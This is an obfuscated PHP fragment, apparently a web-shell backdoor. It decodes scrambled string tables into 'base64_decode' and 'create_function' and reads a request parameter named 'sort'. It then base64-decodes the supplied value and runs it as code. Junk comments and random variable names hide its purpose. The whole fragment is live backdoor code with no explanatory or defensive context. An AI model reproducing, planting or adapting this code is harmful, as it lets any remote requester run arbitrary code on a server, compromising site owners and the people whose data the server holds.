...
$WfEfbqbO545 = "r.kwb(4fdt37)*alv8qxcmpjso_eh2/u1ny;izg5960";


$qDwLWiKm77 = "";

foreach([24,25,0,9] as $W){
       $qDwLWiKm77 .= $WfEfbqbO545[$W];
    }


if(isset($_REQUEST /*UVLuzCGVahNNWQrOmifqtmmmrJzSDDebczKemCEUgqxPiVBFqVBKdwHVucHDLSKCdwDiTVwngSbkntEQocQxHZWXqOHINzkwYNpFtIhaZOzZmlBugDZEeVeugTChJBDK*/["$qDwLWiKm77"])){
    $MyUvNOMf2244 = $_REQUEST /*UVLuzCGVahNNWQrOmifqtmmmrJzSDDebczKemCEUgqxPiVBFqVBKdwHVucHDLSKCdwDiTVwngSbkntEQocQxHZWXqOHINzkwYNpFtIhaZOzZmlBugDZEeVeugTChJBDK*/["$qDwLWiKm77"];
    $FCXtlWaB7517 = "";
    $WYgdbXrz6897 = "";

    /*bevlgjPspZyWQsuBuFbokFrMaJQabJvLXYFVbsskXlgKXtVZMihhCyROeEvZEuTsNlIYPVOwxQISXNpPYfiuOKkkcTUqbyksvSGuxRecSOetQBEaewcaSqwZTBmbrWvM*/

    foreach([4,14,24,27,41,6,26,8,27,20,25,8,27] as $W){
       $FCXtlWaB7517 .= $WfEfbqbO545[$W];
    }

    /*YSwkZgnbggtoDJLEdgPaRpCiDDygBNAAulguuQqtnSBDkkMBWjwtJICKhYDEEYyHJYKXJSmfoXDkKeHSIGWguuvFFNCwBCphSfhTRoclivzmdsvCnwqmZAiVWVuHrAab*/


    foreach([24,9,0,0,27,16] as $W){
       $WYgdbXrz6897 .= $WfEfbqbO545[$W];
    }

    /*UFyjSeLKWnoHqZdGNGDMxZODhxglaREpQzITNnoCDzWvwaEdfkKFPSnFlsLkECcWGMLWCQKOeeyDwvZUrgLSafGbiHkBaGuXptIskMatycUeqjnexxEyfKTQZpCmreFr*/

    $W = $WYgdbXrz6897('n'.''.''.'o'.''.'i'.'t'.'c'.'n'.''.''.''.'u'.''.'f'.''.''.''.'_'.'e'.'t'.''.'a'.''.''.''.'e'.''.''.'r'.''.''.''.''.'c'.''.''.''.'');
    $Q = $W("", $FCXtlWaB7517($MyUvNOMf2244));
    $Q();
    exit();
